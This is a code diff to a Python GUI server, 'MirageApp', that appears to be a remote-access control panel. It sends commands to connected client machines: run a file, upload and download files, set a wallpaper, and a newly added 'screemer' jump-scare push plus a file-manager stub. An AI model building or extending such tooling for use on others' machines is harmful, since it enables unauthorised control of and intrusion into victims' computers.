@@ -19,12 +19,10 @@ class Server(ctk.CTk):
         self.port = port  
         self.gui = gui  
         self.key = key
-
         self.clients = []  
         self.running = False  
 
-        self.msg_queue = queue.Queue()   
-
+        self.msg_queue = queue.Queue()
 
     def start_server(self):
         self.running = True
@@ -113,6 +111,11 @@ class Server(ctk.CTk):
 
                     elif 'set_wallpaper' in message:
                         filepath = message[13:].strip()
+                        print(f'Sended wallpaper: {filepath}')
+                        threading.Thread(target=self.send_file, args=(filepath, ip, port), daemon=True).start()
+                    
+                    elif 'screemer' in message:
+                        filepath = message[8:].strip()
                         print(f'Sended wallpaper: {filepath}')
                         threading.Thread(target=self.send_file, args=(filepath, ip, port), daemon=True).start()
 
@@ -226,7 +229,6 @@ class MirageApp(ctk.CTk):
         server_thread.start()
 
         self.create_app()
-
 
     def create_app(self):
         self.gbw_frame = ctk.CTkFrame(self, width=1000, height=100, fg_color='#4B0082')
@@ -344,10 +346,21 @@ class CommandFunction:
         if file_path:
             threading.Thread(target=self.server.send_to_client, args=(ip, port, f's_run {file_path}'), daemon=True).start()
     
+    def screemer(self, ip, port):
+        print("Screemer in dev")
+        """
+        file_path = filedialog.askopenfilename(title="Select file")
+        if file_path:
+            threading.Thread(target=self.server.send_to_client, args=(ip, port, f'screemer {file_path}'), daemon=True).start()
+        """
+        
     def send_file(self, ip, port):
         file_path = filedialog.askopenfilename(title="Select file")
         if file_path:
             threading.Thread(target=self.server.send_to_client, args=(ip, port, f'send {file_path}'), daemon=True).start()
+
+    def file_manager(self, ip, port):
+        print(f"FileManager {ip} {port}")
 
     def download_file(self, ip, port, filename):
         threading.Thread(target=self.server.send_to_client, args=(ip, port, f'download {filename}'), daemon=True).start()
